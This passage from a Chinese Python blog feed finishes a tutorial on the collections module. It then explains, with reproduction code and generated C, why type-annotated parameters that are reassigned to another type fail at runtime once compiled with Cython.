python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="comment"># 创建一个namedtuple，其类名称为string，其字段为string</span></span><br><span class="line"><span class="comment"># 给定字符串中的字段必须用逗号或空格分隔</span></span><br><span class="line">Point = namedtuple(<span class="string">&#x27;Point&#x27;</span>,<span class="string">&#x27;x, y&#x27;</span>)</span><br><span class="line">pt = Point(<span class="number">1</span>, -<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br><span class="line"><span class="built_in">print</span>(pt._fields)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(pt))</span><br><span class="line"><span class="built_in">print</span>(pt.x, pt.y)</span><br><span class="line"></span><br><span class="line">Person = namedtuple(<span class="string">&#x27;Person&#x27;</span>,<span class="string">&#x27;name, age&#x27;</span>)</span><br><span class="line">friend = Person(name=<span class="string">&#x27;Tom&#x27;</span>, age=<span class="number">25</span>)</span><br><span class="line"><span class="built_in">print</span>(friend.name, friend.age)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Point(x=<span class="number">1</span>, y=-<span class="number">4</span>)</span><br><span class="line">(<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.Point&#x27;</span>&gt;</span><br><span class="line"><span class="number">1</span> -<span class="number">4</span></span><br><span class="line">Tom <span class="number">25</span></span><br></pre></td></tr></table></figure><h3><span id="ordereddict">OrderedDict</span></h3><p>OrderedDict 就像常规dict一样，但是它们记住条目插入的顺序。 在 OrderedDict 上进行迭代时，将按照条目的键首次添加的顺序返回项。 如果新条目覆盖了现有条目，则原始插入位置将保持不变。 既然内置dict类获得了记住插入顺序的能力（自python 3.7起），它们的重要性就变得不那么重要了。 但是仍然存在一些差异，例如 OrderedDict 被设计为擅长重新排序操作。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line">ordinary_dict = &#123;&#125;</span><br><span class="line">ordinary_dict[<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span></span><br><span class="line">ordinary_dict[<span class="string">&#x27;b&#x27;</span>] = <span class="number">2</span></span><br><span class="line">ordinary_dict[<span class="string">&#x27;c&#x27;</span>] = <span class="number">3</span></span><br><span class="line">ordinary_dict[<span class="string">&#x27;d&#x27;</span>] = <span class="number">4</span></span><br><span class="line">ordinary_dict[<span class="string">&#x27;e&#x27;</span>] = <span class="number">5</span></span><br><span class="line"><span class="comment"># 在Python 3.7之前，这个可能是任意顺序</span></span><br><span class="line"><span class="built_in">print</span>(ordinary_dict)</span><br><span class="line"></span><br><span class="line">ordered_dict = OrderedDict()</span><br><span class="line">ordered_dict[<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span></span><br><span class="line">ordered_dict[<span class="string">&#x27;b&#x27;</span>] = <span class="number">2</span></span><br><span class="line">ordered_dict[<span class="string">&#x27;c&#x27;</span>] = <span class="number">3</span></span><br><span class="line">ordered_dict[<span class="string">&#x27;d&#x27;</span>] = <span class="number">4</span></span><br><span class="line">ordered_dict[<span class="string">&#x27;e&#x27;</span>] = <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(ordered_dict)</span><br><span class="line"><span class="comment"># 与普通dict具有相同的功能，但始终有序</span></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> ordinary_dict.items():</span><br><span class="line">    <span class="built_in">print</span>(k, v)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;e&#x27;</span>: <span class="number">5</span>&#125;</span><br><span class="line">OrderedDict([(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;d&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">5</span>)])</span><br><span class="line">a <span class="number">1</span></span><br><span class="line">b <span class="number">2</span></span><br><span class="line">c <span class="number">3</span></span><br><span class="line">d <span class="number">4</span></span><br><span class="line">e <span class="number">5</span></span><br></pre></td></tr></table></figure><h3><span id="defaultdict">defaultdict</span></h3><p>defaultdict是一个与通常的dict容器相似的容器，但是唯一的区别是，如果尚未设置该键，则defaultdict将具有默认值。 如果不使用defaultdict，则你必须检查该键是否存在，如果不存在，则将其设置为所需的键。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化一个默认int值，即 0</span></span><br><span class="line">d = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">d[<span class="string">&#x27;yellow&#x27;</span>] = <span class="number">1</span></span><br><span class="line">d[<span class="string">&#x27;blue&#x27;</span>] = <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(d.items())</span><br><span class="line"><span class="built_in">print</span>(d[<span class="string">&#x27;green&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化一个默认列表值，即空列表</span></span><br><span class="line">d = defaultdict(<span class="built_in">list</span>)</span><br><span class="line">s = [(<span class="string">&#x27;yellow&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;blue&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;yellow&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;blue&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;red&#x27;</span>, <span class="number">5</span>)]</span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> s:</span><br><span class="line">    d[k].append(v)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d.items())</span><br><span class="line"><span class="built_in">print</span>(d[<span class="string">&#x27;green&#x27;</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict_items([(<span class="string">&#x27;yellow&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;blue&#x27;</span>, <span class="number">2</span>)])</span><br><span class="line"><span class="number">0</span></span><br><span class="line">dict_items([(<span class="string">&#x27;yellow&#x27;</span>, [<span class="number">1</span>, <span class="number">3</span>]), (<span class="string">&#x27;blue&#x27;</span>, [<span class="number">2</span>, <span class="number">4</span>]), (<span class="string">&#x27;red&#x27;</span>, [<span class="number">5</span>])])</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><h3><span id="deque">deque</span></h3><p>deque是双端队列。 它可用于在两端添加或删除元素。 deque支持从队列的任一侧线程安全，内存高效地追加和弹出，在任一方向上大致相同的 <code>O(1)</code> 性能。 更常用的栈和队列是双端队列的退化形式，其中输入和输出限制为单端。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line">d = deque()</span><br><span class="line"></span><br><span class="line"><span class="comment"># append() : 添加元素到右端</span></span><br><span class="line">d.append(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">d.append(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># appendleft() : 添加元素到左端</span></span><br><span class="line">d.appendleft(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop() : 返回并删除右端元素</span></span><br><span class="line"><span class="built_in">print</span>(d.pop())</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># popleft() : 返回并删除左端元素</span></span><br><span class="line"><span class="built_in">print</span>(d.popleft())</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() : 删除所有元素</span></span><br><span class="line">d.clear()</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">d = deque([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在右端或者左端扩展</span></span><br><span class="line">d.extend([<span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>])</span><br><span class="line">d.extendleft([<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>]) <span class="comment"># 主语 &#x27;j&#x27; 现在在最左侧 </span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># count(x) : 返回找到的元素个数</span></span><br><span class="line"><span class="built_in">print</span>(d.count(<span class="string">&#x27;h&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向右旋转1个位置</span></span><br><span class="line">d.rotate(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">向左旋转<span class="number">2</span>个位置</span><br><span class="line">d.rotate(-<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">deque([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">deque([<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">b</span><br><span class="line">deque([<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">c</span><br><span class="line">deque([<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">deque([])</span><br><span class="line">deque([<span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>])</span><br><span class="line"><span class="number">1</span></span><br><span class="line">deque([<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>])</span><br><span class="line">deque([<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;j&#x27;</span>])</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      06. collections — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python 函数变量类型注释会导致用 Cython 编译后执行与直接执行结果不一致</title>
    <link href="https://qiwihui.com/qiwihui-blog-117/"/>
    <id>https://qiwihui.com/qiwihui-blog-117/</id>
    <published>2022-08-13T01:54:25.700Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>最近工作中遇到关于函数类型注释引起的错误，特此记录一下。</p><p>起因是公司的项目为了安全和执行速度，在发布时会使用 Cython 转为 C 语言并编译成动态连接库进行调用，但是有个函数在 Python 执行时正常，但是在动态连接库中却执行错误。</p><span id="more"></span><h2><span id="cuo-wu-fu-xian">错误复现</span></h2><p>测试用例 <code>test.py</code>：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ip_str</span>(<span class="params">ips: <span class="built_in">str</span></span>):</span><br><span class="line">    ips = [x <span class="keyword">for</span> x <span class="keyword">in</span> ips]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ip</span>(<span class="params">ips</span>):</span><br><span class="line">    ips = [x <span class="keyword">for</span> x <span class="keyword">in</span> ips]</span><br></pre></td></tr></table></figure><p>编译 <code>compile.py</code>：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">from</span> Cython.Build <span class="keyword">import</span> cythonize</span><br><span class="line"></span><br><span class="line">extensions = [<span class="string">&quot;test.py&quot;</span>,]</span><br><span class="line"></span><br><span class="line">setup(name=<span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">      ext_modules=cythonize(extensions)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>运行编译：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python compile.py build</span><br></pre></td></tr></table></figure><p>编译之后进入对应 so 文件目录 <code>build/lib-&#123;平台架构&#125;</code>，运行对比：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import <span class="built_in">test</span></span><br><span class="line">&gt;&gt;&gt; test.ip(<span class="string">&quot;123&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; test.ip_str(<span class="string">&quot;123&quot;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line 5, <span class="keyword">in</span> test.ip_str</span><br><span class="line">TypeError: Expected str, got list</span><br></pre></td></tr></table></figure><p>经过调查发现，当函数变量做了类型注释时，不能重新赋值为其他类型，否则会在 Cython 编译后执行时报错。</p><p>Cython 可以在编译时推断出部分简单的错误，比如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ip1</span>():</span><br><span class="line">    ips: <span class="built_in">str</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ips = [<span class="string">&#x27;1&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Error compiling Cython file:</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">def ip1():</span><br><span class="line">    ips: str = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ips = [<span class="string">&#x27;1&#x27;</span>]</span><br><span class="line">         ^</span><br><span class="line">------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">test.py:10:10: Cannot coerce list to <span class="built_in">type</span> <span class="string">&#x27;str object&#x27;</span></span><br></pre></td></tr></table></figure><p>但如果代码比较复杂，则只能在运行时才会出错。所以上述错误只能在执行的时候才被抛出。</p><h2><span id="yuan-yin">原因</span></h2><p>Cython 将 Python 转为 C 代码比较后类型注释与否代码比较：</p><ul><li><p>没有类型注释：</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* &quot;test.py&quot;:2</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * def ip_str(ips: str):             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"> *     ips = [x for x in ips]</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Python wrapper */</span></span><br><span class="line"><span class="type">static</span> PyObject *__pyx_pw_4test_1ip_str(PyObject *__pyx_self, PyObject *__pyx_v_ips); <span class="comment">/*proto*/</span></span><br><span class="line"><span class="type">static</span> PyMethodDef __pyx_mdef_4test_1ip_str = &#123;<span class="string">&quot;ip_str&quot;</span>, (PyCFunction)__pyx_pw_4test_1ip_str, METH_O, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">static</span> PyObject *__pyx_pw_4test_1ip_str(PyObject *__pyx_self, PyObject *__pyx_v_ips) &#123;</span><br><span class="line">  PyObject *__pyx_r = <span class="number">0</span>;</span><br><span class="line">  __Pyx_RefNannyDeclarations</span><br><span class="line">  __Pyx_RefNannySetupContext(<span class="string">&quot;ip_str (wrapper)&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (unlikely(!__Pyx_ArgTypeTest(((PyObject *)__pyx_v_ips), (&amp;PyString_Type), <span class="number">1</span>, <span class="string">&quot;ips&quot;</span>, <span class="number">1</span>))) __PYX_ERR(<span class="number">0</span>, <span class="number">2</span>, __pyx_L1_error)</span><br><span class="line">  __pyx_r = __pyx_pf_4test_ip_str(__pyx_self, ((PyObject*)__pyx_v_ips));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* function exit code */</span></span><br><span class="line">  <span class="keyword">goto</span> __pyx_L0;</span><br><span class="line">  __pyx_L1_error:;</span><br><span class="line">  __pyx_r = <span class="literal">NULL</span>;</span><br><span class="line">  __pyx_L0:;</span><br><span class="line">  __Pyx_RefNannyFinishContext();</span><br><span class="line">  <span class="keyword">return</span> __pyx_r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> PyObject *__pyx_pf_4test_ip_str(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ips) &#123;</span><br><span class="line">  PyObject *__pyx_v_x = <span class="literal">NULL</span>;</span><br><span class="line">  PyObject *__pyx_r = <span class="literal">NULL</span>;</span><br><span class="line">  __Pyx_RefNannyDeclarations</span><br><span class="line">  PyObject *__pyx_t_1 = <span class="literal">NULL</span>;</span><br><span class="line">  PyObject *__pyx_t_2 = <span class="literal">NULL</span>;</span><br><span class="line">  PyObject *(*__pyx_t_3)(PyObject *);</span><br><span class="line">  PyObject *__pyx_t_4 = <span class="literal">NULL</span>;</span><br><span class="line">  __Pyx_RefNannySetupContext(<span class="string">&quot;ip_str&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  __Pyx_INCREF(__pyx_v_ips);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &quot;test.py&quot;:3</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * def ip_str(ips: str):</span></span><br><span class="line"><span class="comment"> *     ips = [x for x in ips]             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * def ip(ips):</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  __pyx_t_1 = PyList_New(<span class="number">0</span>); <span class="keyword">if</span> (unlikely(!__pyx_t_1)) __PYX_ERR(<span class="number">0</span>, <span class="number">3</span>, __pyx_L1_error)</span><br><span class="line">  __Pyx_GOTREF(__pyx_t_1);</span><br><span class="line">  __pyx_t_2 = PyObject_GetIter(__pyx_v_ips); <span class="keyword">if</span> (unlikely(!__pyx_t_2)) __PYX_ERR(<span class="number">0</span>, <span class="number">3</span>, __pyx_L1_error)</span><br><span class="line">  __Pyx_GOTREF(__pyx_t_2);</span><br><span class="line">  __pyx_t_3 = Py_TYPE(__pyx_t_2)-&gt;tp_iternext; <span class="keyword">if</span> (unlikely(!__pyx_t_3)) __PYX_ERR(<span class="number">0</span>, <span class="number">3</span>, __pyx_L1_error)</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    &#123;</span><br><span class="line">      __pyx_t_4 = __pyx_t_3(__pyx_t_2);</span><br><span class="line">      <span class="keyword">if</span> (unlikely(!__pyx_t_4)) &#123;</span><br><span class="line">        PyObject* exc_type = PyErr_Occurred();</span><br><span class="line">        <span class="keyword">if</span> (exc_type) &#123;</span><br><span class="line">          <span class="keyword">if</span> (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();</span><br><span class="line">          <span class="keyword">else</span> __PYX_ERR(<span class="number">0</span>, <span class="number">3</span>, __pyx_L1_error)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      __Pyx_GOTREF(__pyx_t_4);</span><br><span class="line">    &#125;</span><br><span class="line">    __Pyx_XDECREF_SET(__pyx_v_x, __pyx_t_4);</span><br><span class="line">    __pyx_t_4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(__Pyx_ListComp_Append(__pyx_t_1, (PyObject*)__pyx_v_x))) __PYX_ERR(<span class="number">0</span>, <span class="number">3</span>, __pyx_L1_error)</span><br><span class="line">  &#125;</span><br><span class="line">  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(likely(PyString_CheckExact(__pyx_t_1))||(PyErr_Format(PyExc_TypeError, <span class="string">&quot;Expected %.16s, got %.200s&quot;</span>, <span class="string">&quot;str&quot;</span>, Py_TYPE(__pyx_t_1)-&gt;tp_name), <span class="number">0</span>))) __PYX_ERR(<span class="number">0</span>, <span class="number">3</span>, __pyx_L1_error)</span><br><span class="line">  __Pyx_DECREF_SET(__pyx_v_ips, ((PyObject*)__pyx_t_1));</span><br><span class="line">  __pyx_t_1 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li><li><p>有类型注释：</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* &quot;test.py&quot;:2</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * def ip_str(ips: str):             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"> *     ips = [x for x in ips]</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* function exit code */</span></span><br><span class="line">  __pyx_r = Py_None; __Pyx_INCREF(Py_None);</span><br><span class="line">  <span class="keyword">goto</span> __pyx_L0;</span><br><span class="line">  __pyx_L1_error:;</span><br><span class="line">  __Pyx_XDECREF(__pyx_t_1);</span><br><span class="line">  __Pyx_XDECREF(__pyx_t_2);</span><br><span class="line">  __Pyx_XDECREF(__pyx_t_4);</span><br><span class="line">  __Pyx_AddTraceback(<span class="string">&quot;test.ip_str&quot;</span>, __pyx_clineno, __pyx_lineno, __pyx_filename);</span><br><span class="line">  __pyx_r = <span class="literal">NULL</span>;</span><br><span class="line">  __pyx_L0:;</span><br><span class="line">  __Pyx_XDECREF(__pyx_v_x);</span><br><span class="line">  __Pyx_XDECREF(__pyx_v_ips);</span><br><span class="line">  __Pyx_XGIVEREF(__pyx_r);</span><br><span class="line">  __Pyx_RefNannyFinishContext();</span><br><span class="line">  <span class="keyword">return</span> __pyx_r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &quot;test.py&quot;:5</span></span><br><span class="line"><span class="comment"> *     ips = [x for x in ips]</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * def ip(ips):             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"> *     ips = [x for x in ips]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Python wrapper */</span></span><br><span class="line"><span class="type">static</span> PyObject *__pyx_pw_4test_3ip(PyObject *__pyx_self, PyObject *__pyx_v_ips); <span class="comment">/*proto*/</span></span><br><span class="line"><span class="type">static</span> PyMethodDef __pyx_mdef_4test_3ip = &#123;<span class="string">&quot;ip&quot;</span>, (PyCFunction)__pyx_pw_4test_3ip, METH_O, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">static</span> PyObject *__pyx_pw_4test_3ip(PyObject *__pyx_self, PyObject *__pyx_v_ips) &#123;</span><br><span class="line">  PyObject *__pyx_r = <span class="number">0</span>;</span><br><span class="line">  __Pyx_RefNannyDeclarations</span><br><span class="line">  __Pyx_RefNannySetupContext(<span class="string">&quot;ip (wrapper)&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  __pyx_r = __pyx_pf_4test_2ip(__pyx_self, ((PyObject *)__pyx_v_ips));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* function exit code */</span></span><br><span class="line">  __Pyx_RefNannyFinishContext();</span><br><span class="line">  <span class="keyword">return</span> __pyx_r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> PyObject *__pyx_pf_4test_2ip(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ips) &#123;</span><br><span class="line">  PyObject *__pyx_v_x = <span class="literal">NULL</span>;</span><br><span class="line">  PyObject *__pyx_r = <span class="literal">NULL</span>;</span><br><span class="line">  __Pyx_RefNannyDeclarations</span><br><span class="line">  PyObject *__pyx_t_1 = <span class="literal">NULL</span>;</span><br><span class="line">  PyObject *__pyx_t_2 = <span class="literal">NULL</span>;</span><br><span class="line">  Py_ssize_t __pyx_t_3;</span><br><span class="line">  PyObject *(*__pyx_t_4)(PyObject *);</span><br><span class="line">  PyObject *__pyx_t_5 = <span class="literal">NULL</span>;</span><br><span class="line">  __Pyx_RefNannySetupContext(<span class="string">&quot;ip&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  __Pyx_INCREF(__pyx_v_ips);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &quot;test.py&quot;:6</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * def ip(ips):</span></span><br><span class="line"><span class="comment"> *     ips = [x for x in ips]             # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  __pyx_t_1 = PyList_New(<span class="number">0</span>); <span class="keyword">if</span> (unlikely(!__pyx_t_1)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">  __Pyx_GOTREF(__pyx_t_1);</span><br><span class="line">  <span class="keyword">if</span> (likely(PyList_CheckExact(__pyx_v_ips)) || PyTuple_CheckExact(__pyx_v_ips)) &#123;</span><br><span class="line">    __pyx_t_2 = __pyx_v_ips; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = <span class="number">0</span>;</span><br><span class="line">    __pyx_t_4 = <span class="literal">NULL</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    __pyx_t_3 = <span class="number">-1</span>; __pyx_t_2 = PyObject_GetIter(__pyx_v_ips); <span class="keyword">if</span> (unlikely(!__pyx_t_2)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">    __Pyx_GOTREF(__pyx_t_2);</span><br><span class="line">    __pyx_t_4 = Py_TYPE(__pyx_t_2)-&gt;tp_iternext; <span class="keyword">if</span> (unlikely(!__pyx_t_4)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (likely(!__pyx_t_4)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (likely(PyList_CheckExact(__pyx_t_2))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__pyx_t_3 &gt;= PyList_GET_SIZE(__pyx_t_2)) <span class="keyword">break</span>;</span><br><span class="line">        <span class="meta">#<span class="keyword">if</span> CYTHON_ASSUME_SAFE_MACROS &amp;&amp; !CYTHON_AVOID_BORROWED_REFS</span></span><br><span class="line">        __pyx_t_5 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_5); __pyx_t_3++; <span class="keyword">if</span> (unlikely(<span class="number">0</span> &lt; <span class="number">0</span>)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">        <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        __pyx_t_5 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; <span class="keyword">if</span> (unlikely(!__pyx_t_5)) __PYX_ERR(<span class="number">0</span>, <span class="number">6</span>, __pyx_L1_error)</span><br><span class="line">        __Pyx_GOTREF(__pyx_t_5);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (__pyx_t_3 &gt;= 